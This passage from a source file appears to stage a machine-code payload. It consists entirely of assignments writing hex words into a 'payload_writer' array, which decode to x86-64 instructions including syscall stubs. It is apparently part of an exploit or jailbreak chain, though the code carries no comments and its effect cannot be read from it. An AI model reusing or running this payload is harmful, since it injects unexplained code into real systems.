  payload_writer[1332] = 0x3bfd8300;
  payload_writer[1333] = 0x8d48237e;
  payload_writer[1334] = 0x000e3415;
  payload_writer[1335] = 0x0100be00;
  payload_writer[1336] = 0x89480000;
  payload_writer[1337] = 0xffc031df;
  payload_writer[1338] = 0x00176315;
  payload_writer[1339] = 0xdf894800;
  payload_writer[1340] = 0xc9e8ed31;
  payload_writer[1341] = 0xeb000005;
  payload_writer[1342] = 0x89c5ff02;
  payload_writer[1343] = 0x000ab9e8;
  payload_writer[1344] = 0x48990000;
  payload_writer[1345] = 0x0e3b358d;
  payload_writer[1346] = 0xf9f70000;
  payload_writer[1347] = 0x4cf7894c;
  payload_writer[1348] = 0xc289e989;
  payload_writer[1349] = 0x18244489;
  payload_writer[1350] = 0x15ffc031;
  payload_writer[1351] = 0x00001890;
  payload_writer[1352] = 0x0001ffba;
  payload_writer[1353] = 0x0601be00;
  payload_writer[1354] = 0x894c0000;
  payload_writer[1355] = 0x060ce8f7;
  payload_writer[1356] = 0xf8830000;
  payload_writer[1357] = 0xc48941ff;
  payload_writer[1358] = 0x4c8b8c74;
  payload_writer[1359] = 0x8d481824;
  payload_writer[1360] = 0x000e2315;
  payload_writer[1361] = 0x0100be00;
  payload_writer[1362] = 0x89480000;
  payload_writer[1363] = 0xffc031df;
  payload_writer[1364] = 0x0016fb15;
  payload_writer[1365] = 0xdf894800;
  payload_writer[1366] = 0x61e8ed31;
  payload_writer[1367] = 0x41000005;
  payload_writer[1368] = 0x45ffc883;
  payload_writer[1369] = 0x02b9c931;
  payload_writer[1370] = 0xba000010;
  payload_writer[1371] = 0x00000003;
  payload_writer[1372] = 0x001000be;
  payload_writer[1373] = 0xe8ff3100;
  payload_writer[1374] = 0x000006b2;
  payload_writer[1375] = 0x247c8d4c;
  payload_writer[1376] = 0xc0314560;
  payload_writer[1377] = 0x48c68949;
  payload_writer[1378] = 0x0824448b;
  payload_writer[1379] = 0x49e98949;
  payload_writer[1380] = 0xb90ce1c1;
  payload_writer[1381] = 0x00001000;
  payload_writer[1382] = 0x4cf2894c;
  payload_writer[1383] = 0x8944ef89;
  payload_writer[1384] = 0x491c2444;
  payload_writer[1385] = 0x4c01348d;
  payload_writer[1386] = 0x10244c89;
  payload_writer[1387] = 0xfffe7be8;
  payload_writer[1388] = 0x4c8b4cff;
  payload_writer[1389] = 0xd2311024;
  payload_writer[1390] = 0x4ce78944;
  payload_writer[1391] = 0x53e8ce89;
  payload_writer[1392] = 0xba000006;
  payload_writer[1393] = 0x00001000;
  payload_writer[1394] = 0x44f6894c;
  payload_writer[1395] = 0x5fe8e789;
  payload_writer[1396] = 0x44000005;
  payload_writer[1397] = 0x1c24448b;
  payload_writer[1398] = 0x000064b9;
  payload_writer[1399] = 0x488d4500;
  payload_writer[1400] = 0xc169410a;
  payload_writer[1401] = 0x000069b8;
  payload_writer[1402] = 0x48f9f799;
  payload_writer[1403] = 0xe8394898;
  payload_writer[1404] = 0x4c8b3377;
  payload_writer[1405] = 0x89451824;
  payload_writer[1406] = 0x4c8944c8;
  payload_writer[1407] = 0x8d481024;
  payload_writer[1408] = 0x000d9c15;
  payload_writer[1409] = 0x0100be00;
  payload_writer[1410] = 0x894c0000;
  payload_writer[1411] = 0xffc031ff;
  payload_writer[1412] = 0x00163b15;
  payload_writer[1413] = 0xff894c00;
  payload_writer[1414] = 0x0004a3e8;
  payload_writer[1415] = 0x4c8b4400;
  payload_writer[1416] = 0x89451024;
  payload_writer[1417] = 0xc5ff48c8;
  payload_writer[1418] = 0xb8fd8148;
  payload_writer[1419] = 0x0f000069;
  payload_writer[1420] = 0xffff5285;
  payload_writer[1421] = 0x158d48ff;
  payload_writer[1422] = 0x00000d88;
  payload_writer[1423] = 0x000100be;
  payload_writer[1424] = 0xdf894800;
  payload_writer[1425] = 0x15ffc031;
  payload_writer[1426] = 0x00001604;
  payload_writer[1427] = 0xe8df8948;
  payload_writer[1428] = 0x0000046c;
  payload_writer[1429] = 0xe8e78944;
  payload_writer[1430] = 0x000004ee;
  payload_writer[1431] = 0xbef7894c;
  payload_writer[1432] = 0x00001000;
  payload_writer[1433] = 0x0005d1e8;
  payload_writer[1434] = 0xc4814800;
  payload_writer[1435] = 0x00000168;
  payload_writer[1436] = 0x5d5bc031;
  payload_writer[1437] = 0x5d415c41;
  payload_writer[1438] = 0x5f415e41;
  payload_writer[1439] = 0xc0c748c3;
  payload_writer[1440] = 0x00000025;
  payload_writer[1441] = 0x000c43e9;
  payload_writer[1442] = 0xc0c74800;
  payload_writer[1443] = 0x00000036;
  payload_writer[1444] = 0x000c37e9;
  payload_writer[1445] = 0xc0c74800;
  payload_writer[1446] = 0x0000000b;
  payload_writer[1447] = 0x000c2be9;
  payload_writer[1448] = 0x358d4800;
  payload_writer[1449] = 0x000013d8;
  payload_writer[1450] = 0x3d8d4852;
  payload_writer[1451] = 0x000010f3;
  payload_writer[1452] = 0x4505c748;
  payload_writer[1453] = 0x00000014;
  payload_writer[1454] = 0xe8000000;
  payload_writer[1455] = 0x0000044c;
  payload_writer[1456] = 0x2a74c085;
  payload_writer[1457] = 0xb5358d48;
  payload_writer[1458] = 0x48000013;
  payload_writer[1459] = 0x0d0e3d8d;
  payload_writer[1460] = 0x35e80000;
  payload_writer[1461] = 0x85000004;
  payload_writer[1462] = 0x481374c0;
  payload_writer[1463] = 0x139e358d;
  payload_writer[1464] = 0x8d480000;
  payload_writer[1465] = 0x000d0a3d;
  payload_writer[1466] = 0x041ee800;
  payload_writer[1467] = 0x3d8b0000;
  payload_writer[1468] = 0x0000138c;
  payload_writer[1469] = 0x8d158d48;
  payload_writer[1470] = 0x48000013;
  payload_writer[1471] = 0x0d04358d;
  payload_writer[1472] = 0xede80000;
  payload_writer[1473] = 0x8b000003;
  payload_writer[1474] = 0x0013733d;
  payload_writer[1475] = 0x158d4800;
  payload_writer[1476] = 0x000013b4;
  payload_writer[1477] = 0xfd358d48;
  payload_writer[1478] = 0xe800000c;
  payload_writer[1479] = 0x000003d4;
  payload_writer[1480] = 0x135a3d8b;
  payload_writer[1481] = 0x8d480000;
  payload_writer[1482] = 0x0013d315;
  payload_writer[1483] = 0x358d4800;
  payload_writer[1484] = 0x00000cf5;
  payload_writer[1485] = 0x0003bbe8;
  payload_writer[1486] = 0x413d8b00;
  payload_writer[1487] = 0x48000013;
  payload_writer[1488] = 0x139a158d;
  payload_writer[1489] = 0x8d480000;
  payload_writer[1490] = 0x000ce435;
  payload_writer[1491] = 0x03a2e800;
  payload_writer[1492] = 0x3d8b0000;
  payload_writer[1493] = 0x00001328;
  payload_writer[1494] = 0xc1158d48;
  payload_writer[1495] = 0x48000013;
  payload_writer[1496] = 0x0cda358d;
  payload_writer[1497] = 0x89e80000;
  payload_writer[1498] = 0x8b000003;
  payload_writer[1499] = 0x00130f3d;
  payload_writer[1500] = 0x158d4800;
  payload_writer[1501] = 0x000013d0;
  payload_writer[1502] = 0xda358d48;
  payload_writer[1503] = 0xe800000c;
  payload_writer[1504] = 0x00000370;
  payload_writer[1505] = 0x12f63d8b;
  payload_writer[1506] = 0x8d480000;
  payload_writer[1507] = 0x00133f15;
  payload_writer[1508] = 0x358d4800;
  payload_writer[1509] = 0x00000cdf;
  payload_writer[1510] = 0x000357e8;
  payload_writer[1511] = 0xdd3d8b00;
  payload_writer[1512] = 0x48000012;
  payload_writer[1513] = 0x12e6158d;
  payload_writer[1514] = 0x8d480000;
  payload_writer[1515] = 0x000cdf35;
  payload_writer[1516] = 0x033ee800;
  payload_writer[1517] = 0x3d8b0000;
  payload_writer[1518] = 0x000012c4;
  payload_writer[1519] = 0x55158d48;
  payload_writer[1520] = 0x48000013;
  payload_writer[1521] = 0x0ce3358d;
  payload_writer[1522] = 0x25e80000;
  payload_writer[1523] = 0x8b000003;
  payload_writer[1524] = 0x0012ab3d;
  payload_writer[1525] = 0x158d4800;
  payload_writer[1526] = 0x00001394;
  payload_writer[1527] = 0xd8358d48;
  payload_writer[1528] = 0xe800000c;
  payload_writer[1529] = 0x0000030c;
  payload_writer[1530] = 0x12923d8b;
  payload_writer[1531] = 0x8d480000;
  payload_writer[1532] = 0x0012fb15;
  payload_writer[1533] = 0x358d4800;
  payload_writer[1534] = 0x00000ccd;
  payload_writer[1535] = 0x0002f3e8;
  payload_writer[1536] = 0x793d8b00;
  payload_writer[1537] = 0x48000012;
  payload_writer[1538] = 0x1302158d;
  payload_writer[1539] = 0x8d480000;
  payload_writer[1540] = 0x000cc235;
  payload_writer[1541] = 0x02dae800;
  payload_writer[1542] = 0x3d8b0000;
  payload_writer[1543] = 0x00001260;
  payload_writer[1544] = 0x01158d48;
  payload_writer[1545] = 0x48000013;
  payload_writer[1546] = 0x0cb8358d;
  payload_writer[1547] = 0xc1e80000;
  payload_writer[1548] = 0x8b000002;
  payload_writer[1549] = 0x0012473d;
  payload_writer[1550] = 0x158d4800;
  payload_writer[1551] = 0x00001268;
  payload_writer[1552] = 0xae358d48;
  payload_writer[1553] = 0xe800000c;
  payload_writer[1554] = 0x000002a8;
  payload_writer[1555] = 0x122e3d8b;
  payload_writer[1556] = 0x8d480000;
  payload_writer[1557] = 0x0012f715;
  payload_writer[1558] = 0x358d4800;
  payload_writer[1559] = 0x00000ca4;
  payload_writer[1560] = 0x00028fe8;
  payload_writer[1561] = 0x153d8b00;
  payload_writer[1562] = 0x48000012;
  payload_writer[1563] = 0x11fe158d;
  payload_writer[1564] = 0x8d480000;
  payload_writer[1565] = 0x000c9b35;
  payload_writer[1566] = 0x0276e800;
  payload_writer[1567] = 0x3d8b0000;
  payload_writer[1568] = 0x000011fc;
  payload_writer[1569] = 0xad158d48;
  payload_writer[1570] = 0x48000012;
  payload_writer[1571] = 0x0c98358d;
  payload_writer[1572] = 0x5de80000;
  payload_writer[1573] = 0x8b000002;
  payload_writer[1574] = 0x0011e33d;
  payload_writer[1575] = 0x158d4800;
  payload_writer[1576] = 0x0000120c;
  payload_writer[1577] = 0x97358d48;
  payload_writer[1578] = 0xe800000c;
  payload_writer[1579] = 0x00000244;
  payload_writer[1580] = 0x11ca3d8b;
  payload_writer[1581] = 0x8d480000;
  payload_writer[1582] = 0x00122b15;
  payload_writer[1583] = 0x358d4800;
  payload_writer[1584] = 0x00000c95;
  payload_writer[1585] = 0x00022be8;
  payload_writer[1586] = 0xb13d8b00;
  payload_writer[1587] = 0x48000011;
  payload_writer[1588] = 0x12b2158d;
  payload_writer[1589] = 0x8d480000;
  payload_writer[1590] = 0x000c8335;
  payload_writer[1591] = 0x0212e800;
  payload_writer[1592] = 0x3d8b0000;
  payload_writer[1593] = 0x00001198;
  payload_writer[1594] = 0xe9158d48;
  payload_writer[1595] = 0x48000011;
  payload_writer[1596] = 0x0c77358d;
  payload_writer[1597] = 0xf9e80000;
  payload_writer[1598] = 0x8b000001;
  payload_writer[1599] = 0x00117f3d;
  payload_writer[1600] = 0x158d4800;
  payload_writer[1601] = 0x00001190;
  payload_writer[1602] = 0x66358d48;
  payload_writer[1603] = 0xe800000c;
  payload_writer[1604] = 0x000001e0;
  payload_writer[1605] = 0x11663d8b;
  payload_writer[1606] = 0x8d480000;
  payload_writer[1607] = 0x00123f15;
  payload_writer[1608] = 0x358d4800;
  payload_writer[1609] = 0x00000c54;
  payload_writer[1610] = 0x0001c7e8;
  payload_writer[1611] = 0x4d3d8b00;
  payload_writer[1612] = 0x48000011;
  payload_writer[1613] = 0x11f6158d;
  payload_writer[1614] = 0x8d480000;
  payload_writer[1615] = 0x000c4835;
  payload_writer[1616] = 0x01aee800;
  payload_writer[1617] = 0x3d8b0000;
  payload_writer[1618] = 0x00001134;
  payload_writer[1619] = 0x15158d48;
  payload_writer[1620] = 0x48000012;
  payload_writer[1621] = 0x0c46358d;
  payload_writer[1622] = 0x95e80000;
  payload_writer[1623] = 0x8b000001;
  payload_writer[1624] = 0x00111b3d;
  payload_writer[1625] = 0x158d4800;
  payload_writer[1626] = 0x0000114c;
  payload_writer[1627] = 0x43358d48;
  payload_writer[1628] = 0xe800000c;
  payload_writer[1629] = 0x0000017c;
  payload_writer[1630] = 0x11023d8b;
  payload_writer[1631] = 0x8d480000;
  payload_writer[1632] = 0x0011d315;
  payload_writer[1633] = 0x358d4800;
  payload_writer[1634] = 0x00000c40;
  payload_writer[1635] = 0x000163e8;
  payload_writer[1636] = 0xe93d8b00;
  payload_writer[1637] = 0x48000010;
  payload_writer[1638] = 0x11e2158d;
  payload_writer[1639] = 0x8d480000;
  payload_writer[1640] = 0x000c3d35;
  payload_writer[1641] = 0x014ae800;
  payload_writer[1642] = 0x3d8b0000;
  payload_writer[1643] = 0x000010d0;
  payload_writer[1644] = 0x09158d48;
  payload_writer[1645] = 0x48000011;
  payload_writer[1646] = 0x0c3a358d;
  payload_writer[1647] = 0x31e80000;
  payload_writer[1648] = 0x8b000001;
  payload_writer[1649] = 0x0010b73d;
  payload_writer[1650] = 0x158d4800;
  payload_writer[1651] = 0x000010a8;
  payload_writer[1652] = 0x28358d48;
  payload_writer[1653] = 0xe800000c;
  payload_writer[1654] = 0x00000118;
  payload_writer[1655] = 0x109e3d8b;
  payload_writer[1656] = 0x8d480000;
  payload_writer[1657] = 0x0010b715;
  payload_writer[1658] = 0x358d4800;
  payload_writer[1659] = 0x00000c16;
  payload_writer[1660] = 0x0000ffe8;
  payload_writer[1661] = 0x853d8b00;
  payload_writer[1662] = 0x48000010;
  payload_writer[1663] = 0x1176158d;
  payload_writer[1664] = 0x8d480000;
  payload_writer[1665] = 0x000c0435;
  payload_writer[1666] = 0x00e6e800;
  payload_writer[1667] = 0x3d8b0000;
  payload_writer[1668] = 0x0000106c;
  payload_writer[1669] = 0xed158d48;
  payload_writer[1670] = 0x48000010;
  payload_writer[1671] = 0x0bf2358d;
  payload_writer[1672] = 0xcde80000;
  payload_writer[1673] = 0x8b000000;
  payload_writer[1674] = 0x0010533d;
  payload_writer[1675] = 0x158d4800;
  payload_writer[1676] = 0x0000110c;
  payload_writer[1677] = 0xe0358d48;
  payload_writer[1678] = 0xe800000b;
  payload_writer[1679] = 0x000000b4;
  payload_writer[1680] = 0x103a3d8b;
  payload_writer[1681] = 0x8d480000;
  payload_writer[1682] = 0x0010ab15;
  payload_writer[1683] = 0x8d485800;
  payload_writer[1684] = 0x000bcf35;
  payload_writer[1685] = 0x009ae900;
  payload_writer[1686] = 0x53550000;
  payload_writer[1687] = 0x50c93145;
  payload_writer[1688] = 0x31c03145;
  payload_writer[1689] = 0x31d231c9;
  payload_writer[1690] = 0x3d8d48f6;
  payload_writer[1691] = 0x00000bbd;
  payload_writer[1692] = 0x10aa15ff;
  payload_writer[1693] = 0xc9310000;
  payload_writer[1694] = 0x89c93145;
  payload_writer[1695] = 0xc03145c5;
  payload_writer[1696] = 0xf631d231;
  payload_writer[1697] = 0xc83d8d48;
  payload_writer[1698] = 0xff00000b;
  payload_writer[1699] = 0x00108f15;
  payload_writer[1700] = 0x48ef8900;
  payload_writer[1701] = 0x10fe158d;
  payload_writer[1702] = 0xc3890000;
  payload_writer[1703] = 0xdc358d48;
  payload_writer[1704] = 0xe800000b;
  payload_writer[1705] = 0x0000004c;
  payload_writer[1706] = 0x5bdf8959;
  payload_writer[1707] = 0xf5158d48;
  payload_writer[1708] = 0x5d000010;
  payload_writer[1709] = 0xed358d48;
  payload_writer[1710] = 0xe900000b;
  payload_writer[1711] = 0x00000034;
  payload_writer[1712] = 0xfa894853;
  payload_writer[1713] = 0x00ec8148;
  payload_writer[1714] = 0x48000002;
  payload_writer[1715] = 0x0bf7358d;
  payload_writer[1716] = 0x89480000;
  payload_writer[1717] = 0xffc031e7;
  payload_writer[1718] = 0x0012d315;
  payload_writer[1719] = 0xe6894800;
  payload_writer[1720] = 0x0000debf;
  payload_writer[1721] = 0xad15ff00;
  payload_writer[1722] = 0x48000010;
  payload_writer[1723] = 0x0200c481;
  payload_writer[1724] = 0xc35b0000;
  payload_writer[1725] = 0x4fc0c748;
  payload_writer[1726] = 0xe9000002;
  payload_writer[1727] = 0x000007cc;
  payload_writer[1728] = 0x50c0c748;
  payload_writer[1729] = 0xe9000002;
  payload_writer[1730] = 0x000007c0;
  payload_writer[1731] = 0x50f18948;
  payload_writer[1732] = 0x8948d231;
  payload_writer[1733] = 0xc03145fe;
  payload_writer[1734] = 0x000252bf;
  payload_writer[1735] = 0xe8c03100;
  payload_writer[1736] = 0x000007a5;
  payload_writer[1737] = 0xc748c35a;
  payload_writer[1738] = 0x000003c0;
  payload_writer[1739] = 0x079ae900;
  payload_writer[1740] = 0xc7480000;
  payload_writer[1741] = 0x000004c0;
  payload_writer[1742] = 0x078ee900;
  payload_writer[1743] = 0xc7480000;
  payload_writer[1744] = 0x000005c0;
  payload_writer[1745] = 0x0782e900;
  payload_writer[1746] = 0xc7480000;
  payload_writer[1747] = 0x000006c0;
  payload_writer[1748] = 0x0776e900;
  payload_writer[1749] = 0xc7480000;
  payload_writer[1750] = 0x00000ac0;
  payload_writer[1751] = 0x076ae900;
  payload_writer[1752] = 0xc7480000;
  payload_writer[1753] = 0x000009c0;
  payload_writer[1754] = 0x075ee900;
  payload_writer[1755] = 0xc7480000;
  payload_writer[1756] = 0x00003ac0;
  payload_writer[1757] = 0x0752e900;
  payload_writer[1758] = 0xc7480000;
  payload_writer[1759] = 0x000039c0;
  payload_writer[1760] = 0x0746e900;
  payload_writer[1761] = 0xc7480000;
  payload_writer[1762] = 0x000015c0;
  payload_writer[1763] = 0x073ae900;
  payload_writer[1764] = 0xc7480000;
  payload_writer[1765] = 0x00017ac0;
  payload_writer[1766] = 0x072ee900;
  payload_writer[1767] = 0xc7480000;
  payload_writer[1768] = 0x000016c0;
  payload_writer[1769] = 0x0722e900;
  payload_writer[1770] = 0xc7480000;
  payload_writer[1771] = 0x00007bc0;
  payload_writer[1772] = 0x0716e900;
  payload_writer[1773] = 0xc7480000;
  payload_writer[1774] = 0x00007cc0;
  payload_writer[1775] = 0x070ae900;
  payload_writer[1776] = 0xc7480000;
  payload_writer[1777] = 0x000080c0;
  payload_writer[1778] = 0x06fee900;
  payload_writer[1779] = 0xc7480000;
  payload_writer[1780] = 0x000088c0;
  payload_writer[1781] = 0x06f2e900;
  payload_writer[1782] = 0xc7480000;
  payload_writer[1783] = 0x000089c0;
  payload_writer[1784] = 0x06e6e900;
  payload_writer[1785] = 0xc7480000;
  payload_writer[1786] = 0x0000bcc0;
  payload_writer[1787] = 0x06dae900;
  payload_writer[1788] = 0xc7480000;
  payload_writer[1789] = 0x0000bdc0;
  payload_writer[1790] = 0x06cee900;
  payload_writer[1791] = 0xc7480000;
  payload_writer[1792] = 0x0000bec0;
  payload_writer[1793] = 0x06c2e900;
  payload_writer[1794] = 0xc7480000;
  payload_writer[1795] = 0x000110c0;
  payload_writer[1796] = 0x06b6e900;
  payload_writer[1797] = 0xc7480000;
  payload_writer[1798] = 0x0001dec0;
  payload_writer[1799] = 0x06aae900;
  payload_writer[1800] = 0xc7480000;
  payload_writer[1801] = 0x0001edc0;
  payload_writer[1802] = 0x069ee900;
  payload_writer[1803] = 0xc7480000;
  payload_writer[1804] = 0x0001ddc0;
  payload_writer[1805] = 0x0692e900;
  payload_writer[1806] = 0xc7480000;
  payload_writer[1807] = 0x000049c0;
  payload_writer[1808] = 0x0686e900;
  payload_writer[1809] = 0xc7480000;
  payload_writer[1810] = 0x00004ac0;
  payload_writer[1811] = 0x067ae900;
  payload_writer[1812] = 0xc7480000;
  payload_writer[1813] = 0x000041c0;
  payload_writer[1814] = 0x066ee900;
  payload_writer[1815] = 0xc7480000;
  payload_writer[1816] = 0x0000cbc0;
  payload_writer[1817] = 0x0662e900;
  payload_writer[1818] = 0xc7480000;
  payload_writer[1819] = 0x0000ccc0;
  payload_writer[1820] = 0x0656e900;
  payload_writer[1821] = 0xc7480000;
  payload_writer[1822] = 0x000223c0;
  payload_writer[1823] = 0x064ae900;
  payload_writer[1824] = 0xc7480000;
  payload_writer[1825] = 0x00023cc0;
  payload_writer[1826] = 0x063ee900;
  payload_writer[1827] = 0x8b500000;
  payload_writer[1828] = 0x000deb3d;
  payload_writer[1829] = 0x158d4800;
  payload_writer[1830] = 0x00000f8c;
  payload_writer[1831] = 0x1f358d48;
  payload_writer[1832] = 0xe800000b;
  payload_writer[1833] = 0xfffffe4c;
  payload_writer[1834] = 0x0dd23d8b;
  payload_writer[1835] = 0x8d480000;
  payload_writer[1836] = 0x000f4315;
  payload_writer[1837] = 0x358d4800;
  payload_writer[1838] = 0x00000b17;
  payload_writer[1839] = 0xfffe33e8;
  payload_writer[1840] = 0xb93d8bff;
  payload_writer[1841] = 0x4800000d;
  payload_writer[1842] = 0x0f1a158d;
  payload_writer[1843] = 0x8d480000;
  payload_writer[1844] = 0x000b0d35;
  payload_writer[1845] = 0xfe1ae800;
  payload_writer[1846] = 0x3d8bffff;
  payload_writer[1847] = 0x00000da0;
  payload_writer[1848] = 0x39158d48;
  payload_writer[1849] = 0x4800000f;
  payload_writer[1850] = 0x0b05358d;
  payload_writer[1851] = 0x01e80000;
  payload_writer[1852] = 0x8bfffffe;
  payload_writer[1853] = 0x000d873d;
  payload_writer[1854] = 0x158d4800;
  payload_writer[1855] = 0x00000f00;
  payload_writer[1856] = 0xfb358d48;
  payload_writer[1857] = 0xe800000a;
  payload_writer[1858] = 0xfffffde8;
  payload_writer[1859] = 0x0d6e3d8b;
  payload_writer[1860] = 0x8d480000;
  payload_writer[1861] = 0x000ed715;
  payload_writer[1862] = 0x358d4800;
  payload_writer[1863] = 0x00000af2;
  payload_writer[1864] = 0xfffdcfe8;
  payload_writer[1865] = 0x553d8bff;
  payload_writer[1866] = 0x4800000d;
  payload_writer[1867] = 0x0ea6158d;
  payload_writer[1868] = 0x8d480000;
  payload_writer[1869] = 0x000ae835;
  payload_writer[1870] = 0xfdb6e800;
  payload_writer[1871] = 0x3d8bffff;
  payload_writer[1872] = 0x00000d3c;
  payload_writer[1873] = 0xbd158d48;
  payload_writer[1874] = 0x4800000e;
  payload_writer[1875] = 0x0ae0358d;
  payload_writer[1876] = 0x9de80000;
  payload_writer[1877] = 0x8bfffffd;
  payload_writer[1878] = 0x000d233d;
  payload_writer[1879] = 0x158d4800;
  payload_writer[1880] = 0x00000e6c;
  payload_writer[1881] = 0xdb358d48;
  payload_writer[1882] = 0xe800000a;
  payload_writer[1883] = 0xfffffd84;
  payload_writer[1884] = 0x0d0a3d8b;
  payload_writer[1885] = 0x8d480000;
  payload_writer[1886] = 0x000eb315;
  payload_writer[1887] = 0x358d4800;
  payload_writer[1888] = 0x00000ad9;
  payload_writer[1889] = 0xfffd6be8;
  payload_writer[1890] = 0xf13d8bff;
  payload_writer[1891] = 0x4800000c;
  payload_writer[1892] = 0x0e4a158d;
  payload_writer[1893] = 0x8d480000;
  payload_writer[1894] = 0x000ad435;
  payload_writer[1895] = 0xfd52e800;
  payload_writer[1896] = 0x3d8bffff;
  payload_writer[1897] = 0x00000cd8;
  payload_writer[1898] = 0x69158d48;
  payload_writer[1899] = 0x4800000e;
  payload_writer[1900] = 0x0ad2358d;
  payload_writer[1901] = 0x39e80000;
  payload_writer[1902] = 0x8bfffffd;
  payload_writer[1903] = 0x000cbf3d;
  payload_writer[1904] = 0x158d4800;
  payload_writer[1905] = 0x00000e48;
  payload_writer[1906] = 0x358d4859;
  payload_writer[1907] = 0x00000ad1;
  payload_writer[1908] = 0xfffd1fe9;
  payload_writer[1909] = 0x314553ff;
  payload_writer[1910] = 0xc03145c9;
  payload_writer[1911] = 0xd231c931;
  payload_writer[1912] = 0x8d48f631;
  payload_writer[1913] = 0x000ace3d;
  payload_writer[1914] = 0x3115ff00;
  payload_writer[1915] = 0x4800000d;
  payload_writer[1916] = 0x0e7a158d;
  payload_writer[1917] = 0x8d480000;
  payload_writer[1918] = 0x000ad235;
  payload_writer[1919] = 0x89c38900;
  payload_writer[1920] = 0xfceee8c7;
  payload_writer[1921] = 0xdf89ffff;
  payload_writer[1922] = 0xf9158d48;
  payload_writer[1923] = 0x4800000f;
  payload_writer[1924] = 0x0ac0358d;
  payload_writer[1925] = 0xd9e80000;
  payload_writer[1926] = 0x89fffffc;
  payload_writer[1927] = 0x158d48df;
  payload_writer[1928] = 0x00000e74;
  payload_writer[1929] = 0xb0358d48;
  payload_writer[1930] = 0xe800000a;
  payload_writer[1931] = 0xfffffcc4;
  payload_writer[1932] = 0x8d48df89;
  payload_writer[1933] = 0x000ecf15;
  payload_writer[1934] = 0x358d4800;
  payload_writer[1935] = 0x00000aa2;
  payload_writer[1936] = 0xfffcafe8;
  payload_writer[1937] = 0x48df89ff;
  payload_writer[1938] = 0x0f5a158d;
  payload_writer[1939] = 0x8d480000;
  payload_writer[1940] = 0x000a9535;
  payload_writer[1941] = 0xfc9ae800;
  payload_writer[1942] = 0xdf89ffff;
  payload_writer[1943] = 0x05158d48;
  payload_writer[1944] = 0x4800000f;
  payload_writer[1945] = 0x0a89358d;
  payload_writer[1946] = 0x85e80000;
  payload_writer[1947] = 0x89fffffc;
  payload_writer[1948] = 0x158d48df;
  payload_writer[1949] = 0x00000de0;
  payload_writer[1950] = 0x7b358d48;
  payload_writer[1951] = 0xe800000a;
  payload_writer[1952] = 0xfffffc70;
  payload_writer[1953] = 0x8d48df89;
  payload_writer[1954] = 0x000e8b15;
  payload_writer[1955] = 0x358d4800;
  payload_writer[1956] = 0x00000a6d;
  payload_writer[1957] = 0xfffc5be8;
  payload_writer[1958] = 0x48df89ff;
  payload_writer[1959] = 0x0d96158d;
  payload_writer[1960] = 0x8d480000;
  payload_writer[1961] = 0x000a5f35;
  payload_writer[1962] = 0xfc46e800;
  payload_writer[1963] = 0xdf89ffff;
  payload_writer[1964] = 0x49158d48;
  payload_writer[1965] = 0x4800000e;
  payload_writer[1966] = 0x0a51358d;
  payload_writer[1967] = 0x31e80000;
  payload_writer[1968] = 0x89fffffc;
  payload_writer[1969] = 0x158d48df;
  payload_writer[1970] = 0x00000df4;
  payload_writer[1971] = 0x44358d48;
  payload_writer[1972] = 0xe800000a;
  payload_writer[1973] = 0xfffffc1c;
  payload_writer[1974] = 0x8d48df89;
  payload_writer[1975] = 0x000e4715;
  payload_writer[1976] = 0x358d4800;
  payload_writer[1977] = 0x00000a36;
  payload_writer[1978] = 0xfffc07e8;
  payload_writer[1979] = 0x48df89ff;
  payload_writer[1980] = 0x0ef2158d;
  payload_writer[1981] = 0x8d480000;
  payload_writer[1982] = 0x000a2935;
  payload_writer[1983] = 0xfbf2e800;
  payload_writer[1984] = 0xdf89ffff;
  payload_writer[1985] = 0x8d158d48;
  payload_writer[1986] = 0x4800000e;
  payload_writer[1987] = 0x0a1b358d;
  payload_writer[1988] = 0xdde80000;
  payload_writer[1989] = 0x89fffffb;
  payload_writer[1990] = 0x158d48df;
  payload_writer[1991] = 0x00000dd8;
  payload_writer[1992] = 0x0d358d48;
  payload_writer[1993] = 0xe800000a;
  payload_writer[1994] = 0xfffffbc8;
  payload_writer[1995] = 0x8d48df89;
  payload_writer[1996] = 0x000e7b15;
  payload_writer[1997] = 0x358d4800;
  payload_writer[1998] = 0x00000a00;
  payload_writer[1999] = 0xfffbb3e8;
  payload_writer[2000] = 0x48df89ff;
  payload_writer[2001] = 0x0d06158d;
  payload_writer[2002] = 0x8d480000;
  payload_writer[2003] = 0x0009f335;
  payload_writer[2004] = 0xfb9ee800;
  payload_writer[2005] = 0xdf89ffff;
  payload_writer[2006] = 0xc1158d48;
  payload_writer[2007] = 0x4800000d;
  payload_writer[2008] = 0x09e7358d;
  payload_writer[2009] = 0x89e80000;
  payload_writer[2010] = 0x89fffffb;
  payload_writer[2011] = 0x158d48df;
  payload_writer[2012] = 0x00000e7c;
  payload_writer[2013] = 0xd9358d48;
  payload_writer[2014] = 0xe8000009;
  payload_writer[2015] = 0xfffffb74;
  payload_writer[2016] = 0x8d48df89;
  payload_writer[2017] = 0x000d0715;
  payload_writer[2018] = 0x358d4800;
  payload_writer[2019] = 0x000009cb;
  payload_writer[2020] = 0xfffb5fe8;
  payload_writer[2021] = 0x48df89ff;
  payload_writer[2022] = 0x0d3a158d;
  payload_writer[2023] = 0x8d480000;
  payload_writer[2024] = 0x0009be35;
  payload_writer[2025] = 0xfb4ae800;
  payload_writer[2026] = 0xdf89ffff;
  payload_writer[2027] = 0x8d158d48;
  payload_writer[2028] = 0x4800000d;
  payload_writer[2029] = 0x09b0358d;
  payload_writer[2030] = 0x35e80000;
  payload_writer[2031] = 0x89fffffb;
  payload_writer[2032] = 0x158d48df;
  payload_writer[2033] = 0x00000d80;
  payload_writer[2034] = 0xa3358d48;
  payload_writer[2035] = 0xe8000009;
  payload_writer[2036] = 0xfffffb20;
  payload_writer[2037] = 0x8d48df89;
  payload_writer[2038] = 0x000cc315;
  payload_writer[2039] = 0x358d4800;
  payload_writer[2040] = 0x0000098d;
  payload_writer[2041] = 0xfffb0be8;
  payload_writer[2042] = 0x48df89ff;
  payload_writer[2043] = 0x0dd6158d;
  payload_writer[2044] = 0x8d480000;
  payload_writer[2045] = 0x00097f35;
  payload_writer[2046] = 0xfaf6e800;
  payload_writer[2047] = 0xdf89ffff;
  payload_writer[2048] = 0xd1158d48;
  payload_writer[2049] = 0x4800000d;
  payload_writer[2050] = 0x0972358d;
  payload_writer[2051] = 0xe1e80000;
  payload_writer[2052] = 0x89fffffa;
  payload_writer[2053] = 0x158d48df;
  payload_writer[2054] = 0x00000cd4;
  payload_writer[2055] = 0x62358d48;
  payload_writer[2056] = 0xe8000009;
  payload_writer[2057] = 0xfffffacc;
  payload_writer[2058] = 0x8d48df89;
  payload_writer[2059] = 0x000c1715;
  payload_writer[2060] = 0x358d4800;
  payload_writer[2061] = 0x00000955;
  payload_writer[2062] = 0xfffab7e8;
